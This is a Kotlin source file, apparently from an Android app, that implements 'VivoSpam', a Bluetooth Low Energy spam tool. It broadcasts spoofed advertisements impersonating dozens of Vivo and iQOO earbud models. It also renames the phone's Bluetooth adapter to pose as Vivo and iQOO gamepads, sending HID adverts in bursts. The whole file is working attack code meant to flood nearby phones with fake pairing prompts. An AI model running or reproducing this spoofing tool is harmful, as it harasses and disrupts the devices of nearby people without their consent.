package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import android.os.ParcelUuid
import java.util.UUID
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class VivoSpam(private val type: VivoDevice.Type) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null

    val devices: Array<VivoDevice>
    private val twsServiceUuid =
        ParcelUuid(UUID.fromString(VivoDevice.TWS_SERVICE_UUID))
    private val hidServiceUuid =
        ParcelUuid(UUID.fromString(VivoDevice.HID_SERVICE_UUID))

    companion object {
        private const val GAMEPAD_BURSTS_PER_NAME = 40
        private const val GAMEPAD_NAME_SETTLE_MS = 600L
    }

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var originalBtName: String? = null
    private var btNameSaved = false

    init {
        devices = when (type) {
            VivoDevice.Type.TWS -> arrayOf(
                VivoDevice(0, null, "vivo TWS 1", VivoDevice.Type.TWS),
                VivoDevice(1, null, "vivo TWS 1", VivoDevice.Type.TWS),
                VivoDevice(16, null, "vivo TWS Neo", VivoDevice.Type.TWS),
                VivoDevice(17, null, "vivo TWS Neo", VivoDevice.Type.TWS),
                VivoDevice(28, null, "vivo TWS 2", VivoDevice.Type.TWS),
                VivoDevice(29, null, "vivo TWS 2", VivoDevice.Type.TWS),
                VivoDevice(32, null, "vivo TWS 2e", VivoDevice.Type.TWS),
                VivoDevice(33, null, "vivo TWS 2e", VivoDevice.Type.TWS),
                VivoDevice(48, null, "vivo TWS Air", VivoDevice.Type.TWS),
                VivoDevice(49, null, "vivo TWS Air", VivoDevice.Type.TWS),
                VivoDevice(60, null, "vivo TWS 3", VivoDevice.Type.TWS),
                VivoDevice(61, null, "vivo TWS 3", VivoDevice.Type.TWS),
                VivoDevice(64, null, "vivo TWS 3 Pro", VivoDevice.Type.TWS),
                VivoDevice(65, null, "vivo TWS 3 Pro", VivoDevice.Type.TWS),
                VivoDevice(68, null, "iQOO TWS Air", VivoDevice.Type.TWS),
                VivoDevice(69, null, "iQOO TWS Air", VivoDevice.Type.TWS),
                VivoDevice(72, null, "vivo TWS Air Pro", VivoDevice.Type.TWS),
                VivoDevice(73, null, "vivo TWS Air Pro", VivoDevice.Type.TWS),
                VivoDevice(96, null, "iQOO TWS 1", VivoDevice.Type.TWS),
                VivoDevice(97, null, "iQOO TWS 1", VivoDevice.Type.TWS),
                VivoDevice(98, null, "iQOO TWS 1", VivoDevice.Type.TWS),
                VivoDevice(112, null, "vivo TWS 3e", VivoDevice.Type.TWS),
                VivoDevice(113, null, "vivo TWS 3e", VivoDevice.Type.TWS),
                VivoDevice(120, null, "vivo TWS 4", VivoDevice.Type.TWS),
                VivoDevice(121, null, "vivo TWS 4", VivoDevice.Type.TWS),
                VivoDevice(128, null, "vivo TWS 4 Hi-Fi", VivoDevice.Type.TWS),
                VivoDevice(129, null, "vivo TWS 4 Hi-Fi", VivoDevice.Type.TWS),
                VivoDevice(156, null, "vivo TWS Air3", VivoDevice.Type.TWS),
                VivoDevice(157, null, "vivo TWS Air3", VivoDevice.Type.TWS),
                VivoDevice(158, null, "vivo TWS Air3", VivoDevice.Type.TWS),
                VivoDevice(168, null, "vivo TWS Air3 Pro", VivoDevice.Type.TWS),
                VivoDevice(169, null, "vivo TWS Air3 Pro", VivoDevice.Type.TWS),
                VivoDevice(170, null, "vivo TWS Air3 Pro", VivoDevice.Type.TWS),
                VivoDevice(192, null, "vivo TWS 5", VivoDevice.Type.TWS),
                VivoDevice(193, null, "vivo TWS 5", VivoDevice.Type.TWS),
                VivoDevice(194, null, "vivo TWS 5", VivoDevice.Type.TWS),
                VivoDevice(196, null, "vivo TWS 5 Hi-Fi", VivoDevice.Type.TWS),
                VivoDevice(197, null, "vivo TWS 5 Hi-Fi", VivoDevice.Type.TWS),
                VivoDevice(204, null, "vivo TWS 5i", VivoDevice.Type.TWS),
                VivoDevice(205, null, "vivo TWS 5i", VivoDevice.Type.TWS),
                VivoDevice(206, null, "vivo TWS 5i", VivoDevice.Type.TWS),
                VivoDevice(256, null, "vivo TWS 5 Pro", VivoDevice.Type.TWS),
                VivoDevice(257, null, "vivo TWS 5 Pro", VivoDevice.Type.TWS),
                VivoDevice(260, null, "vivo Headphones", VivoDevice.Type.TWS),
                VivoDevice(261, null, "vivo Headphones", VivoDevice.Type.TWS),
                VivoDevice(272, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(273, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(274, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(275, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(276, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(277, null, "vivo Buds Clip", VivoDevice.Type.TWS),
                VivoDevice(278, null, "vivo Buds Clip", VivoDevice.Type.TWS)
            )
            VivoDevice.Type.GAMEPAD -> arrayOf(
                VivoDevice(null, "vivo_a1b2c3", "vivo Gamepad (vivo_xxxxxx)", VivoDevice.Type.GAMEPAD),
                VivoDevice(null, "vivo_3f9a2c", "vivo Gamepad (vivo_xxxxxx)", VivoDevice.Type.GAMEPAD),
                VivoDevice(null, "vivo_00ff11", "vivo Gamepad (vivo_xxxxxx)", VivoDevice.Type.GAMEPAD),
                VivoDevice(null, "iQOO_a1b2c3d", "iQOO Gamepad (iQOO_xxxxxxx)", VivoDevice.Type.GAMEPAD),
                VivoDevice(null, "iQOO_9f8e7d6", "iQOO Gamepad (iQOO_xxxxxxx)", VivoDevice.Type.GAMEPAD),
                VivoDevice(null, "iQOO_iGP2031", "iQOO iGP2031", VivoDevice.Type.GAMEPAD)
            )
        }
    }

    private fun buildTwsAdvertiseData(device: VivoDevice): AdvertiseData {
        return AdvertiseData.Builder()
            .addManufacturerData(VivoDevice.COMPANY_ID, device.toRandomizedManufacturerData())
            .addServiceUuid(twsServiceUuid)
            .build()
    }

    override fun start() {
        executor.execute {
            isSpamming = true
            val bluetoothAdvertiser = BluetoothAdvertiser()
            saveOriginalBtName()
            try {
                if (type == VivoDevice.Type.GAMEPAD) {
                    runGamepadLoop(bluetoothAdvertiser)
                } else {
                    runTwsLoop(bluetoothAdvertiser)
                }
            } finally {
                bluetoothAdvertiser.stopAdvertising()
                restoreBtName()
                isSpamming = false
            }
        }
    }

    private fun runTwsLoop(bluetoothAdvertiser: BluetoothAdvertiser) {
        repeat(Helper.MAX_LOOP + 1) {
            if (!isSpamming) return
            val device = devices.random()
            val dwellMs = VivoDevice.TWS_DWELL_MIN_MS + Helper.random.nextInt(
                (VivoDevice.TWS_DWELL_MAX_MS - VivoDevice.TWS_DWELL_MIN_MS + 1).toInt()
            )
            val dwellEnd = System.currentTimeMillis() + dwellMs
            var sinceRefresh = 0L

            bluetoothAdvertiser.advertise(
                buildTwsAdvertiseData(device),
                null,
                forceLegacy = true,
                connectable = true
            )
            com.droid.dolphy.trackBlePackets(1)

            while (isSpamming) {
                if (System.currentTimeMillis() >= dwellEnd) break
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return
                }
                if (!isSpamming) return
                sinceRefresh += Helper.delay
                if (sinceRefresh >= VivoDevice.TWS_PAYLOAD_REFRESH_MS) {
                    bluetoothAdvertiser.stopAdvertising()
                    bluetoothAdvertiser.advertise(
                        buildTwsAdvertiseData(device),
                        null,
                        forceLegacy = true,
                        connectable = true
                    )
                    com.droid.dolphy.trackBlePackets(1)
                    sinceRefresh = 0
                }
            }
            bluetoothAdvertiser.stopAdvertising()
        }
    }

    private fun runGamepadLoop(bluetoothAdvertiser: BluetoothAdvertiser) {
        repeat(Helper.MAX_LOOP + 1) {
            if (!isSpamming) return
            val device = devices.random()
            setBtName(device.localName.orEmpty())
            var waited = 0L
            while (waited < GAMEPAD_NAME_SETTLE_MS) {
                if (!isSpamming) return
                try {
                    Thread.sleep(100L)
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return
                }
                waited += 100L
            }
            val data = AdvertiseData.Builder()
                .addServiceUuid(hidServiceUuid)
                .setIncludeDeviceName(true)
                .build()
            repeat(GAMEPAD_BURSTS_PER_NAME) {
                if (!isSpamming) return
                bluetoothAdvertiser.advertise(
                    data,
                    null,
                    forceLegacy = true,
                    connectable = true
                )
                com.droid.dolphy.trackBlePackets(1)
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return
                }
                bluetoothAdvertiser.stopAdvertising()
            }
        }
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
    }

    override fun setBlinkRunnable(runnable: Runnable?) {
        this.blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun saveOriginalBtName() {
        if (btNameSaved) return
        try {
            originalBtName = BluetoothHelper.bluetoothAdapter?.name
            btNameSaved = true
        } catch (_: Exception) { }
    }

    private fun setBtName(name: String) {
        if (name.isEmpty()) return
        try {
            BluetoothHelper.bluetoothAdapter?.name = name
        } catch (_: SecurityException) { } catch (_: Exception) { }
    }

    private fun restoreBtName() {
        if (!btNameSaved) return
        try {
            val orig = originalBtName
            if (!orig.isNullOrEmpty()) {
                BluetoothHelper.bluetoothAdapter?.name = orig
            }
        } catch (_: Exception) { } finally {
            btNameSaved = false
        }
    }
}
